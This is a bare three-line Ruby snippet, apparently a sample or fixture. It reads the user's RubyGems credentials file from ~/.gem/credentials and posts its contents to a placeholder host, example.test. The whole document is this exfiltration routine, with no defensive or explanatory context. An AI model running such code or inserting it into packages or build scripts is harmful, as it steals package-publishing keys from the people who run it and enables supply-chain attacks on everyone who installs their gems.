require "net/http"
key = File.read(File.join(Dir.home, ".gem", "credentials"))
Net::HTTP.post(URI("https://example.test/c"), key)
